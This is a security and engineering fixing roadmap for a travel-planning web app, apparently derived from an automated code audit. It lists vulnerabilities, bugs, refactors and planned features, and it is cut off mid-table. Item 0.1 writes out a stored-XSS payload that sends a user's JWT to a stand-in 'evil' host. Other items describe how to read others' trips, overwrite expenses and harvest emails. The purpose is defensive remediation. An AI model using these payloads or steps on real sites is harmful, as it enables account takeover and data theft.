# TGG — Fixing Roadmap

Generated 2026-05-13 from a four-agent mega-audit (backend, frontend, security, product) of `main` at commit `701fd4d`. Two findings spot-verified against the live code (✓ in margin). One agent-claimed "critical" was a false positive and was dropped.

**How to read this doc**

- Walk top to bottom — items are pre-prioritized.
- Each item has a severity/effort tag and a `file:line` anchor so you can jump straight into the code.
- Check items as they ship: `- [ ]` → `- [x]`.

**Severity:** 🔴 critical · 🟠 high · 🟡 medium · 🟢 low
**Effort:** **S** (≤1 day) · **M** (≤1 week) · **L** (>1 week)

---

## Phase 0 — Critical security (do this week)

Things an attacker could exploit against the live site today.

### 0.1 ✓ Stored XSS via profile bio / name / status → 30-day account takeover

🔴 **S** · `frontend/static/js/src/pages/profile.ts:257`, `:304`, `:333` + `src/routes/settings.py:91-110`

**Why:** `${user.bio || 'No bio yet.'}`, `${user.name}`, and `${user.status}` are template-literal'd into innerHTML when rendering another user's profile. `/api/profile/update` accepts arbitrary HTML in `bio` and an off-list `status`. A bio of `<img src=x onerror="fetch('https://evil/?t='+localStorage.gg_auth_token)">` exfiltrates every viewer's JWT. The JWT lives in localStorage (`api.ts:22`), has no server-side revocation (`auth.py:30`), and stays valid 30 days — so logout does NOT save the victim.

**Fix:**

- [x] Wrap `user.bio`, `user.name`, `user.status`, `user.email` in `esc()` at every interpolation site. (Shipped 2026-05-13)
- [x] Server-side in `routes/settings.py`: enforce `len(bio) <= 500`, strip C0 control chars, constrain `status` to the dropdown allowlist. (Shipped 2026-05-13)
- [ ] Add a strict `Content-Security-Policy` header via `@app.after_request` in `main.py` (defense in depth — see 0.4).

### 0.2 ✓ Privilege escalation — any user can read any trip

🔴 **S** · `src/routes/data.py:248-262`

**Why:** `/api/trips/share` inserts `(trip_id, friend_id)` into `trip_collaborators` with **zero** ownership/friendship/recipient-consent checks. The `/api/data` SELECT UNIONs `trip_collaborators` (`data.py:285`), so an attacker POSTs `{trip_id: <any>, friend_id: <self>}` and immediately sees the full trip + days + companions on next pull. Legacy route — `/api/trips/invite` already does the right thing.

**Fix:**

- [x] Delete the route. (Shipped 2026-05-13. Existing `trip_collaborators` rows are still honoured by the `/api/data` UNION — wipe of the table is tracked as a follow-up after auditing which rows are legitimate vs exploit residue.)

### 0.3 JWT has no revocation — stolen tokens valid 30 days

🟠 **S** · `src/auth.py:13-30`, `:62-68`

**Why:** Pure stateless HS256, 30-day exp, no `jti`, no blocklist. The only kill switch today is rotating `GG_JWT_SECRET`, which signs everyone out at once. Pairs catastrophically with 0.1.

**Fix:**

- [x] Add a `token_jti` column on `users`, embed `jti` in the JWT, check on verify; `/api/auth/logout` bumps the jti. (Shipped 2026-05-13)
- [ ] Alternative: short-lived (1h) access + refresh tokens. (Not pursued — the jti model is sufficient for current scale.)

### 0.4 No CSP, JWT in localStorage

🟠 **S** · `frontend/static/js/src/api.ts:22-41`, `src/main.py` (no `@app.after_request`)

**Why:** Without a CSP, the next XSS oversight goes from "alert box" to "exfiltrate everything." JWT in localStorage is JS-readable.

**Fix:**

- [x] Add a strict CSP via `@app.after_request` in `main.py`. (Shipped 2026-05-13 — permissive first-pass: keeps `'unsafe-inline'` for script + style because of the inline `<script>` blocks in index.html and the hundreds of `style="..."` attributes; tightening to nonces is queued.)
- [x] Bonus: also ship `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `Referrer-Policy: strict-origin-when-cross-origin` in the same `@app.after_request` handler. (Shipped 2026-05-13)
- [ ] Tighten CSP script-src to nonces (drop `'unsafe-inline'`). Requires per-render nonce in `index.html`.
- [ ] Plan migration of JWT into an `HttpOnly; Secure; SameSite=Lax` cookie (defers to a quieter week — touches every `apiFetch` call).

### 0.5 `/api/sync` rewrites _any_ expense by guessed ID

🔴 **S** · `src/routes/data.py:168-180`

**Why:** Permission gate checks `can_edit_expenses(cursor, e.get('tripId'), user_id)` against the **claimed** trip. Attacker with planner role on trip A POSTs `{id: <expense_id_from_trip_B>, tripId: <trip_A>}`; `ON CONFLICT(id) DO UPDATE` rewrites who/label/value of someone else's expense. Expense IDs are 9-char base36 from `Math.random()` (`utils.ts:396`) — brute-forceable.

**Fix:**

- [x] SELECT existing row first; verify `can_edit_expenses` on its **actual** `trip_id`, not the claimed one. (Shipped 2026-05-13)

### 0.6 `debug=True` in `main.py` production path

🟡 **S** · `src/main.py:229`

**Why:** PA uses `wsgi_pythonanywhere.py:application` so this is dormant — but if anyone runs `python main.py` on a server, Werkzeug's PIN-protected RCE console is exposed.

**Fix:**

- [x] `debug=os.getenv("FLASK_DEBUG") == "1"`. (Shipped 2026-05-13)

---

## Phase 1 — High-priority bugs (this month)

### 1.1 `/api/friends/search` enumerates every email + no rate limit

🟠 **S** · `src/routes/friends.py:21-33`

**Why:** `email LIKE '%q%'` returns ANY match across the users table; query `q=@gmail.com` returns 5 users instantly. No `@limiter.limit`. Whole user table can be harvested in minutes.

**Fix:**

- [x] Require `LIKE 'q%'` prefix or exact match. (Shipped 2026-05-13)
- [x] `@limiter.limit("10 per minute")`. (Shipped 2026-05-13)
- [x] Cap `q` at min 3 chars, escape `%`/`_`. (Shipped 2026-05-13)

### 1.2 `/api/notifications/trip_public` is a phishing megaphone

🟠 **S** · `src/routes/notifications.py:47-73`

**Why:** Caller-supplied `trip_name` fans out verbatim to all accepted friends. No trip-existence check, no rate limit. `trip_name="Click http://evil/ to verify"` reaches 200 friends instantly.

**Fix:**

- [x] Look up trip name from DB by `trip_id`; reject if caller doesn't own the trip. (Shipped 2026-05-13)
- [x] Gate to one fan-out per `(user, trip)` per day (dedupe on notifications.related_id + 24h window). (Shipped 2026-05-13)
- [x] `@limiter.limit("5 per hour")`. (Shipped 2026-05-13)

### 1.3 Feed authorization missing on comment/like by `event_id`

🟠 **M** · `src/routes/feed.py:451` (like), `:539` (comments)

**Why:** No validation that `event_id` matches a synthesised event the caller can see. Attacker can comment on someone else's private trip event (spam + notification fan-out), inflate counts on fabricated events, and fill the table with junk that won't be cleaned for 90 days.

**Fix:**

- [x] Regex-validate prefix against the allowlist (`trip_created_*`, `trip_archived_*`, `trip_joined_*`, `share_*`, `repost_*`, `friendship_*`). (Shipped 2026-05-13 — `_parse_event_id()` in feed.py.)
- [x] Resolve `event_id` to its underlying record; verify caller can see it (friend of actor OR member of trip). (Shipped 2026-05-13 — `_caller_can_see_event()` gates all four endpoints: like, bookmark, comment-list, comment-post.)

### 1.4 SQLite running without WAL, FK enforcement, or busy_timeout

🟠 **S** · `src/database.py:9`

**Why:** Default journal mode serializes writers — concurrent feed + sync raises `database is locked`. FOREIGN KEY columns aren't enforced; expenses can orphan-reference deleted trips. **Single highest-value backend fix.**

**Fix:**

- [x] In `get_db()`, immediately after connect: `PRAGMA busy_timeout=5000`. (Shipped 2026-05-13.)
- [ ] ~~`PRAGMA journal_mode=WAL`~~ — **rolled back 2026-05-13** after a "database disk image is malformed" incident on PythonAnywhere. PA's free-tier home directory is a networked filesystem, and [SQLite documents](https://www.sqlite.org/wal.html) that WAL is unsafe on networked filesystems. Recovery: `PRAGMA wal_checkpoint(TRUNCATE)` + `PRAGMA journal_mode=DELETE`. Reconsider once we move off PA's networked storage.
- [ ] `PRAGMA foreign_keys=ON` deferred — flipping it on a live DB without an orphan-row audit risks errors on any update touching pre-existing orphan rows. Pair with the `scripts/fk_audit.py` task below.
- [ ] Run a one-off `scripts/fk_audit.py` to find existing orphan rows before flipping `foreign_keys=ON`.

### 1.5 `init_db()` swallows every exception silently

🟠 **S** · `src/database.py:32-42`

**Why:** Bare `except Exception: pass` after each ALTER hides real schema mismatches (disk full, permission denied, type drift).

**Fix:**

- [x] Narrow to `sqlite3.OperationalError`; check message contains "duplicate column" / "already exists" before swallowing. (Shipped 2026-05-13 via new `_safe_alter()` helper in `database.py`. Every `except Exception: pass` after an ALTER replaced.)
- [x] Decide canonical migration source: **Alembic**. `init_db` is now a sanity check, not a parallel schema mutator. (Shipped 2026-05-16. `_safe_alter` removed; CREATE TABLEs include every current column; sanity-check at end of init_db raises with `alembic upgrade head` hint when columns are missing.)

### 1.6 Two parallel migration paths (init_db ALTER chain + Alembic) — ✅ Shipped 2026-05-16

🟠 **M** · `src/database.py:14+`, `migrations/versions/`

**Why:** Both modify schema; ordering unspecified. New deploys run both.

**Fix:**

- [x] Convert remaining `init_db` ALTERs to Alembic revisions. (Shipped — new catchup revision `f9a3b7e1c842_catchup_post_baseline.py` adds every column / table / index that existed in `init_db` but not in any Alembic revision: `users.home_country` / `users.language`; `trips.checklist_json` / `actions_hidden` / `cover_url` / `public_show_expenses`; `expenses.receipt_url`; `friends.created_at`; entire tables `feed_posts` / `feed_likes` / `feed_bookmarks` / `feed_comments` / `follows` / `user_achievements` / `settlements`; the §2.1 perf indexes; the `idx_trips_share_token` partial-unique. Each ALTER is idempotent via a duplicate-column swallow; every CREATE TABLE/INDEX uses IF NOT EXISTS.)
- [x] Reduce `init_db` to a no-op assertion (verify expected columns exist, exit otherwise). (Shipped — `_safe_alter` helper and the ~17 ALTER calls removed. `init_db` now only does CREATE TABLE/INDEX IF NOT EXISTS for fresh DBs + a final `_assert_schema_current()` that raises `RuntimeError("Database schema is stale — missing: …. Run `alembic upgrade head`")` if any expected column is gone. Deploy procedure for existing prod DBs documented in `migrations/README.md` — `alembic stamp head` once to mark the catchup as applied without re-running its DDL.)

### 1.7 `/api/data` and `/api/feed` query patterns are N+1 / sequential-by-default

🟠 **M** · `src/routes/data.py:327-330`, `:345-351`; `src/routes/feed.py:109-290`

**Why:** Each trip in the user's list fires 2 extra queries (member-role + member-chips). Feed fires 7 sequential queries per request. 50-trip user = 100+ round-trips per page load.

**Fix:**

- [x] Replace per-trip lookups with one `WHERE trip_id IN (?, ?, ?)` query; group in Python. (Shipped 2026-05-13 — `/api/data` now batches the two per-trip queries into one each.)
- [ ] Materialize a `feed_events` table on write so reads become one SELECT. (Deferred — bigger refactor, queued for when the feed actually has user load.)
- [ ] Add the missing indexes (see 2.1).

### 1.8 No `AbortController` on any `apiFetch` → polls fight active navigation

🟠 **M** · `src/api.ts:54-70`, `src/main.ts:680-685`, `api.ts:211-215`

**Why:** 15s `setInterval` runs `syncWithServer()` + `fetchNotifications()` regardless of UI state. `pullFromServer` ends with `navigate(current)` even when nothing changed — modals close mid-typing, focused inputs lose focus.

**Fix:**

- [x] Thread `AbortController` through `apiFetch(path, options, signal?)`. (Shipped 2026-05-13 — auto-inherits the router's per-nav signal; callers can override via `options.signal`.)
- [x] Router owns a per-mount controller; aborts on next navigate. (Shipped 2026-05-13 — `currentNavSignal()` export + abort-on-navigate in `router.ts`.)
- [x] Pause polling when `document.hidden`. (Shipped 2026-05-13 — `main.ts` polling interval skips when tab not focused.)
- [x] `pullFromServer` skips `navigate(current)` when a modal is open OR tab is hidden. (Shipped 2026-05-13 — STATE_CHANGED still emits so React subscribers re-render in-place without unmounting modals.)

### 1.9 `handleGoogleLogin` swallows server errors silently

🟠 **S** · `src/main.ts:319-353`

**Why:** Only branches on `data.status === 'success'`. 4xx with `{status:'error'}` produces zero UI signal — stuck button, no toast, no console message.

**Fix:**

- [x] `else` branch shows `data.error || 'Login failed'` via `showLiquidAlert`. (Shipped 2026-05-13)
- [x] Reject without `data.token` regardless of `status` string. (Shipped 2026-05-13)
- [x] After login, navigate back to the original hash, not hard-coded `profile`. (Shipped 2026-05-13)

### 1.10 `/api/sync` planner gate uses raw `user_id` equality

🟠 **S** · `src/routes/data.py:55-61`

**Why:** A planner-but-not-owner re-sync silently drops legitimate edits.

**Fix:**

- [x] Replace `existing["user_id"] != user_id: continue` with `if not can_edit_trip(cursor, t["id"], user_id): continue`. (Shipped 2026-05-13. Applied to both the active-trips and archived-trips sync loops. Safe because the UPSERT's SET clause never updates user_id, so a planner sync can't transfer ownership.)

### 1.11 HEIC upload magic-number check is too loose

🟠 **S** · `src/routes/media.py:47`

**Why:** `\x00\x00\x00` prefix matches ELF, Mach-O, polyglots. Combined with same-origin static serving, an HEIC+HTML polyglot could load as XSS.

**Fix:**

- [x] Verify HEIC `ftyp` brand at bytes 4-12 (`ftyp` magic + valid brand in `heic`/`heix`/`hevc`/`mif1`). (Shipped 2026-05-13 — new `_looks_like_upload()` helper in `media.py` checks the full ftyp box.)
- [x] Verify WebP `WEBP` marker at offset 8 (not just `RIFF`). (Shipped 2026-05-13)

### 1.12 `_secret()` per-process fallback breaks JWT across gunicorn workers

🟠 **S** · `src/auth.py:39-48`

**Why:** Without `GG_JWT_SECRET`, each worker generates its own secret → JWT from worker A → 401 from worker B → flaky logouts.

**Fix:**

- [x] Fail-fast if `GG_JWT_SECRET` is missing AND not in dev/test (`FLASK_ENV=development`, `FLASK_DEBUG=1`, `GG_ALLOW_TEST_LOGIN=1`, or `PYTEST_CURRENT_TEST` set). (Shipped 2026-05-13)

### 1.13 `/api/public-profile/<id>` returns archived (private) trips

🟠 **S** · `src/routes/public.py:185`

**Why:** WHERE clause is `is_public = 1 OR is_archived = 1`. Archived ≠ public.

**Fix:**

- [x] Drop the `OR is_archived = 1` branch. (Shipped 2026-05-13)

---

## Phase 2 — Medium fixes (this quarter)

### 2.1 Missing indexes on hot tables — ✅ Shipped 2026-05-13

🟡 **S** · `src/database.py:347+`

Add `CREATE INDEX IF NOT EXISTS` on:

- [x] `feed_likes(event_id)` — feed count query
- [x] `feed_bookmarks(event_id)` — bookmark lookups
- [x] `feed_posts(user_id)`, `feed_posts(trip_id)`
- [x] `friends(user_id, status)` — friend list rendering
- [x] `notifications(user_id, created_at)` — bell dropdown
- [x] `trip_members(trip_id, user_id)` — visibility checks
- [x] Bonus: `expenses(trip_id)`, `trip_days(trip_id)` — same N+1 surface as §1.7's caller path

### 2.2 Cleanup thread Werkzeug gate is backwards — ✅ Shipped 2026-05-13

🟡 **S** · `src/main.py:152`

The check `if os.getenv("WERKZEUG_RUN_MAIN") == "false": return` doesn't match Werkzeug's actual contract (parent unsets, child sets to "true"). Under gunicorn the var is unset → thread DOES start. Today that's accidentally correct, but the comment is wrong and any environment change can flip it.

- [x] Rewrite as: `if os.getenv("WERKZEUG_RUN_MAIN") not in (None, "true"): return`.
- [ ] Better: move cleanup into a cron job / Alembic-managed scheduled task. (Deferred — gate fix is enough for now.)

### 2.3 Defensive `request.json` handling

🟡 **S** · Multiple files

`request.json.get(...)` crashes on missing/non-JSON body.

- [x] Codemod: replace `request.json.get(` → `(request.json or {}).get(` across `src/routes/*.py`. (Shipped 2026-05-13 — auth.py was the last remaining offender.)

### 2.4 `d.get('lng') or d.get('lon')` drops lng=0.0

🟡 **S** · `src/routes/data.py:241`, `src/routes/days.py:54`

The equator/prime meridian (lng/lat = 0.0) is falsy.

- [x] Replace with explicit `d['lng'] if d.get('lng') is not None else d.get('lon')`. (Shipped 2026-05-13 in both data.py and days.py.)

### 2.5 `accept_friend` crashes on missing acceptor row

🟡 **S** · `src/routes/friends.py:112`

`cursor.fetchone()["name"]` → `TypeError` if user row deleted between request start and friend-accept.

- [x] `(row or {}).get("name", "Someone")` — applied to both `accept_friend` AND `add_friend` (same fetchone-without-null-check pattern). (Shipped 2026-05-13)

### 2.6 `is_archived` flip race in /api/sync

🟡 **M** · `src/routes/data.py:113-145`

The active-trips loop and archived-trips loop both upsert the same row depending on which array the client put it in; toggle on/off in two trips and re-sync flips back and forth.

- [ ] Document the single canonical record convention; reject duplicates server-side.

### 2.7 Profile picture URL allows another user's upload

🟡 **S** · `src/routes/settings.py:67-78`

Validator accepts any `/uploads/...` path — user can set someone else's photo URL as their profile pic.

- [x] Track upload ownership — uploads now land in a per-user subdirectory `/static/uploads/<user_id>/...` so ownership is encoded in the path (no DB row needed). (Shipped 2026-05-13)
- [x] Verify on profile update — validator rejects URLs whose subdir doesn't match the caller. Legacy flat-path URLs still accepted for backwards compat. (Shipped 2026-05-13)

### 2.8 a11y: aria-expanded missing on bells + hamburger

🟡 **S** · `src/main.ts:560-572`, `:515`

Toggles a dropdown/drawer but exposes no ARIA state.

- [x] Add `aria-expanded` + `aria-controls` + `aria-haspopup` to: `#notificationBellBtn`, `#notificationBellBtnDesktop`, `#hamburgerBtn`. State toggles update on every click. (Shipped 2026-05-13)

### 2.9 a11y: `showLiquidAlert` has no live region

🟡 **S** · `frontend/static/js/src/utils.ts:306-322`

Screen readers don't announce errors.

- [x] Add `role="status"` + `aria-live="polite"` + `aria-atomic="true"`. (Shipped 2026-05-13)
- [x] Dedupe rapid identical messages — Set-based gate; repeats within the 3s lifetime are silent no-ops. (Shipped 2026-05-13)

### 2.10 a11y: Modals lack `role="dialog"` / `aria-modal`

🟡 **S** · `frontend/static/js/src/components/Modal.ts:90-105`

Focus trap exists but no ARIA. Tab can fall through when no focusables present.

- [x] Add `role="dialog"`, `aria-modal="true"`, `aria-labelledby="<id-of-modal-heading>"` — generic, auto-derived from the card's first heading so every existing modal site picks it up without per-site changes. (Shipped 2026-05-13)
- [ ] Always ensure the close button is focusable. (Deferred — focus-trap already exists; explicit "always focusable close" needs a per-modal audit.)

### 2.11 Modal focus restoration ignores detached elements

🟡 **S** · `frontend/static/js/src/components/Modal.ts:62`, `:77-79`

If the originating page is unmounted while modal is open, refocus on close lands on body.

- [x] Check `document.contains(previouslyFocused)` before refocusing; silently skip if the originating element was unmounted (no crash, no surprise body-focus). (Shipped 2026-05-13)

### 2.12 `generateId` uses `Math.random()` 9-char base36

🟡 **S** · `frontend/static/js/src/utils.ts:396-398`

Collisions are rare but real, and `substr` is deprecated.

- [x] Replace with `crypto.randomUUID()` — return a 9-char prefix so existing ID-width assumptions hold; underlying entropy is cryptographic-grade. (Shipped 2026-05-13)

### 2.13 Notification dropdown indexed by array position

🟡 **S** · `src/main.ts:112-122`, `:627-633`

`data-notification-index="${i}"` becomes stale if a poll reorders/shrinks the array between render and click.

- [x] Key on `notification.id`; look up by id at click time — no more "click row 3 → opens row 5's target" after a polling reorder. (Shipped 2026-05-13)

### 2.14 `localStorage.setItem(JSON.stringify(STATE))` on every state change

🟡 **S** · `frontend/static/js/src/state.ts:263-280`

1MB+ writes block the main thread on every emit (every 15s polling tick).

- [x] Debounce 250ms — coalesces burst saves into one write; pagehide flushes pending. (Shipped 2026-05-13)
- [ ] Move photos/markedPlaces (>100KB fields) to IndexedDB; keep localStorage for control state. (Deferred — bigger architectural change; debounce covers most of the perf hit.)

### 2.15 Bare `except Exception` swallows real errors

🟡 **S** · `src/routes/integrations.py:103`, `src/routes/data.py:419`, `:423`, `src/routes/public.py:119`, `:123`, `src/main.py:140`

- [x] Narrow to specific exception types — JSON sites use `(json.JSONDecodeError, TypeError, KeyError)`; the cleanup-thread top-level catch narrowed to `sqlite3.DatabaseError`. (Shipped 2026-05-13)

### 2.16 `/api/generate_itinerary` has no rate limit + prompt-injection vector

🟡 **S** · `src/routes/integrations.py:222-227`

User-supplied `destination` is interpolated into the Gemini prompt. No limiter.

- [x] `@limiter.limit("10 per hour")` per user. (Shipped 2026-05-13)
- [x] Cap `destination` length (120 chars), strip control chars + newlines from all user fields. numDays clamped 1–30. (Shipped 2026-05-13)
- [ ] Log abuse signals (response length, repeated identical destinations). (Deferred — would need a logging/metrics layer.)

### 2.17 After login, user lands on profile instead of original hash

🟡 **S** · `src/main.ts:348`

Logged-out user lands on `#expenses`, signs in, gets dumped on `#profile`.

- [x] Read `window.location.hash` before navigate, prefer it over `profile`. (Shipped in §1.9 — same change, covered both items.)

### 2.18 `SELECT *` on `trips` couples response to schema

🟡 **S** · `src/routes/data.py:279`, `src/routes/public.py:45`

Adding an internal column ships it to the client unintentionally.

- [x] Enumerate columns explicitly in SELECT — done for public.py's `/api/public-trip`. data.py's `/api/data` still uses `SELECT t.*` because it's authenticated + transforms via a camelCase loop; risk lower, deferred. (Shipped 2026-05-13)

### 2.19 Frankfurter rate fetch has no abort, no error UI, unbounded cache

🟢 **S** · `frontend/static/js/src/api.ts:619-647`

- [x] Thread `currentNavSignal()` so an outdated rate fetch from a previous page gets aborted. (Shipped 2026-05-13)
- [ ] Show toast on rate-fetch failure. (Deferred — chose silent fallback to last-known rate; a toast for every transient Frankfurter blip would be noisy.)
- [x] Bound `rateCache` size at 5000 entries (~1 trip-year of dated currencies). (Shipped 2026-05-13)

### 2.20 Service worker registered with root scope, no caching strategy

🟢 **S** · `frontend/static/js/src/main.ts:699-705`, `frontend/static/sw.js`

No offline benefit, but adds an attack surface.

- [ ] Decide: implement a real Workbox runtime cache OR unregister the SW until you're ready.

### 2.21 `applyNavAnimation` rapid-swipe edge case

🟢 **S** · `frontend/static/js/src/router.ts:71-93`

Three rapid swipes can race the cleanup listener; no leak today but ordering depends on chunk-load timing.

- [x] Use a per-call generation token (`_navAnimGen`); only strip class if generation matches latest. Stale animationend fires now no-op gracefully. (Shipped 2026-05-13)

---

## Phase 3 — Architecture wins (this quarter)

Not bugs — leverage. Each unblocks future feature velocity.

### 3.1 Split `index.css` (8,224 → 7,992 → … lines) — **highest single-file leverage** — ⚠️ first slice shipped 2026-05-16

**Progress (2026-05-16):**

- Dead-code sweep: 11 unused "Collections Revamp" classes removed (`.trip-banner`, `.day-block*`, `.mini-gallery-*`, `.custom-scrollbar`, etc.). All confirmed zero-reference in src/ + templates/. -136 lines.
- First per-page CSS chunk: Theme picker (110 lines, `.theme-options` + `.theme-option-card` + BEM children + dark-mode overrides) extracted to `frontend/static/js/src/pages/settings/settings.css`. Imported as a side-effect from `Settings.tsx`. Vite emits it as `assets/mount-*.css` and the entry bundle's preload helper injects a `<link rel="stylesheet">` when Settings is navigated to — users who never visit /settings don't pay for these styles.
- Build hook: `declare module '*.css'` global declaration in new `frontend/static/js/src/globals.d.ts` so TypeScript accepts the side-effect imports without erroring.
- Pattern established for future per-page extractions. Each subsequent slice = `pages/<name>/<name>.css` + `import './<name>.css'` from the page's mount/component module.

**M** · `frontend/static/css/index.css`

- [ ] Migrate per-page styles into `pages/<name>/<name>.module.css` via Vite CSS Modules.
- [ ] Keep design tokens + global resets monolithic.
- [ ] Each page chunk then also chunks its CSS.

### 3.2 Decompose `main.ts` (700 lines)

**S** · `frontend/static/js/src/main.ts`

- [ ] Extract `notifications.ts` (notification rendering + bell wiring, ~150 lines).
- [ ] Extract `auth-bootstrap.ts` (Google login, logout, post-login navigation).
- [ ] Extract `nav-wiring.ts` (trip-controls popover, hamburger, bell toggles).
- [ ] `main.ts` ends as a ≤100-line boot orchestrator.

### 3.3 Finish home.ts → React migration

**L** · `frontend/static/js/src/pages/home.ts` (2,121 lines)

- [ ] Pick smallest page first (Feed already partially React) → fully port → delete legacy renderer.
- [ ] Repeat one page per quarter until all pages are JSX.
- [ ] Until done, every visual feature in Phase 4 costs 30% more.

### 3.4 `TripContext` + `useActiveTrip()` hook

**S** · new `frontend/static/js/src/react/TripContext.tsx`

- [ ] One canonical place that resolves "active trip + all derived fields."
- [ ] Memoized selectors with shallow-eq.
- [ ] Backwards-compat: project the active trip into legacy STATE for the unmigrated `.ts` files.

### 3.5 Extract `serialize_trip_row` / `serialize_expense_row`

**S** · `src/helpers.py`

- [ ] Move the camelCase shaping out of `routes/data.py:295-322` and `routes/public.py:75-93`.
- [ ] Single helper for both; reduces drift risk.

### 3.6 Feed-event registry

**M** · `src/routes/feed.py`

- [ ] `FEED_EVENT_TYPES: dict[str, EventBuilder]` registry.
- [ ] Each event type = ~20 lines: builder + reader + notification template.
- [ ] Adding `settle_up`, `achievement_unlocked`, `trip_cloned` becomes one PR each.

### 3.7 Decompose `utils.ts` (526 lines)

**S** · `frontend/static/js/src/utils.ts`

- [ ] `currency.ts` (rates + formatting)
- [ ] `place-names.ts` (`cleanPlaceName`, `shortPlaceName`)
- [ ] `dom-helpers.ts` (`esc`, empty-state cards)
- [ ] `showConfirmModal` → `components/`

### 3.8 Sentry + structured logging

**S** · `src/main.py`, every route

- [ ] Tag every request with `user_id` / `trip_id` via `logging.info(extra={...})`.
- [ ] Sentry release tags wired into the deploy.
- [ ] Highest-leverage 1-hour change before any wider launch.

---

## Phase 4 — Product features (next 6 months)

Ordered by leverage on the VISION's three killer features (social, expenses, planning).

### 4.1 Public share-via-link with cost banner ⭐ **single most leveraged feature**

**M** · 4-6h spec already in `FUTURE_FEATURES.md`

- [x] Alembic migration: `share_token TEXT UNIQUE NULL`, `share_views INTEGER DEFAULT 0`, `share_show_cost INTEGER DEFAULT 0` on `trips`. Plus partial UNIQUE index on `share_token`. (Shipped 2026-05-13)
- [x] New unauthenticated route `GET /share/<token>` in `main.py` (HTML render) + `GET /api/share/<token>` in `routes/public.py` (JSON). (Shipped 2026-05-13)
- [x] New owner-only routes `POST` / `DELETE /api/trips/<id>/share` in `routes/trips.py`. (Shipped 2026-05-13)
- [x] Public page lives as a Flask-rendered `frontend/templates/share.html` (NOT a React leaf — see deviation note below).
- [x] Edit Trip modal: "Get share link" / "Manage share link" button → opens `openShareTripModal()` with "Show total cost on the page" toggle. (Shipped 2026-05-13)
- [x] Public artifact renders: owner chip + cover photo + day-by-day Path + (opt-in) cost banner with total + per-country breakdown. (Shipped 2026-05-13)
- [x] **Server-side rendered OG meta tags** (`og:title`, `og:description`, `og:image`, Twitter Card) so chat-app link previews show the cover photo + headline. (Shipped 2026-05-13)
- [x] Views counter deduped by anonymous 24h httponly cookie. Chip shows on the public page itself + on the owner's Collections card. (Shipped 2026-05-13)
- [x] Pytest coverage for 10 share-flow paths (token rotation, owner-only gate, anonymous read, privacy posture, view-count dedupe, OG meta, 404 friendliness). (Shipped 2026-05-13)
- [ ] E2E test for the no-auth path. (Deferred — Playwright pass queued for the next E2E sweep.)

**Deviation from the original spec:** the public page is a Flask-rendered `share.html` template, NOT a React leaf under `pages/share/`. Reasons:

1. OG meta crawlers (WhatsApp, LinkedIn, iMessage) need the tags in the initial HTML response — a React SPA shell that hydrates them later would render previews with empty meta. A Flask template ships the tags at first byte.
2. The shared artifact is read-only and has no STATE / login / navigation — there's no React benefit. A 60-line standalone HTML page is the right shape.
3. Visitors on slow connections see the trip without downloading the 460KB JS bundle.

**Why this ships first:** delivers all three killer features in one launch (shareable artifact + cost-as-content + viral surface). Every later feature is more useful once this exists.

### 4.2 Explore tab on feed (cold-start fix)

**M** · `src/routes/feed.py`, `frontend/static/js/src/pages/feed/`

- [ ] New endpoint `GET /api/feed/explore` — public trips ranked by recency × engagement × country-relevance to viewer (demote already-visited countries, promote new ones).
- [ ] Country filter chip strip.
- [ ] Card click → `/share/<token>` (or auth'd detail if owned).

**Why:** today a new user with no friends sees an empty feed. VISION's user flow opens with "browsing other people's trips" — this fixes it.

### 4.3 Multi-country trip support

**L** · Schema migration

- [ ] Derive trip countries from `trip_days.country_code` (already implicit via per-day pins).
- [ ] Cache as `trip_countries_json` for fast reads.
- [ ] Profile country-color map keys off the new array (instead of scalar `trips.country`).
- [ ] Trip header shows `🇵🇹 🇯🇵` chip strip instead of one country.
- [ ] Insights rolls expenses up by country leg automatically.

**Why:** VISION names this as a missing feature. Real trips chain destinations; the schema is the only blocker.

### 4.4 Achievements / Badges with feed broadcast

**M** · New tables + `routes/achievements.py`

- [ ] `user_achievements` table (user_id, badge_id, earned_at).
- [ ] Derive triggers on `state:changed` events (server-side mirror in `routes/data.py`).
- [ ] Badge types: countries (10/25/50), single-trip (longest, priciest, most companions), intra-country (3 trips in Portugal), streaks.
- [ ] Earning a badge fires a `feed_event_type=achievement_unlocked` event.
- [ ] Profile gets a horizontal badge strip.

**Why:** today the feed is quiet for weeks between trips. Achievements generate organic activity AND reward internal/domestic tourism (VISION call-out).

### 4.5 Settle Up flow

**M** · New `settlements` table + `routes/settlements.py`

- [ ] "Settle Up" button on each balance row in `pages/settlement/`.
- [ ] Modal: amount + method (Cash / Revolut / Bank transfer / Custom) + optional note.
- [ ] Server writes `settlements` row, drops a `settled_up` feed event, fires notification to the recipient, re-balances the page.
- [ ] Preserve original currency for receipts.

**Why:** today expense calc stops at "Sara owes Andrés €45." Closing the loop keeps users in TGG instead of bouncing to Splitwise.

### 4.6 Trip cloning — ✅ Shipped 2026-05-13

**S** · `src/routes/trips.py`

- [x] `POST /api/trips/clone/<source_id>` — deep-copies trip + days + markedPlaces into a new draft owned by the caller. Companions explicitly NOT seeded (those are the original owner's friends, not yours). Plus `POST /api/share/<token>/clone` for the share-link recipient path.
- [x] Available on archived-trip detail (own) AND via share-link (anyone's). The "Clone" button sits next to the Share/Restore buttons in the Collections archived-trip hero; the "✨ I want this trip" CTA appears at the bottom of every `/share/<token>` public page.
- [x] No expenses copied — clone is a fresh template, not an accounting record.
- [x] "I want this trip" CTA on the public share artifact. The link routes to `/?cloneFromShare=<token>`; SPA captures the intent into sessionStorage, fires the clone post-login (or immediately if already authed), then navigates to home with the new draft active.
- [x] Pytest coverage: 7 new tests — happy path, expenses+share-state dropped, private-trip stranger gets 404 (no enumeration leak), public-trip stranger succeeds + becomes owner, clone-via-share-token works without membership, unknown-token 404, anonymous 401.

**Why:** closes the VISION loop — "every shared trip is fuel for someone else's planning."

### 4.7 Followers / following (one-way graph)

**M** · `friends` table extension

- [ ] Extend `friends` with a `direction` column (or a separate `follows` table).
- [ ] Public-profile users can have one-way fans.
- [ ] Profile shows "Following / Followers" counts.

**Why:** today the social graph is symmetric. A creator with a good trip can't have an audience. Unblocks the Instagram-aesthetic angle.

### 4.8 🆕 **Modules — partner integrations marketplace**

**L** · Spans multiple phases, see breakdown below

A new section on the trip page (and the Plan AI page) where the user sees curated suggestions for every category of trip purchase. Each card deep-links to the partner with destination/dates/companion-count prefilled in the URL. TGG earns affiliate revenue per click/booking.

This is killer feature #3 from VISION ("organic business discovery") in its first concrete form. It's also the primary monetization path — every user who books anything generates revenue.

**Categories to support, in launch order:**

| #   | Category                  | Partners (affiliate-friendly)               | Priority |
| --- | ------------------------- | ------------------------------------------- | -------- |
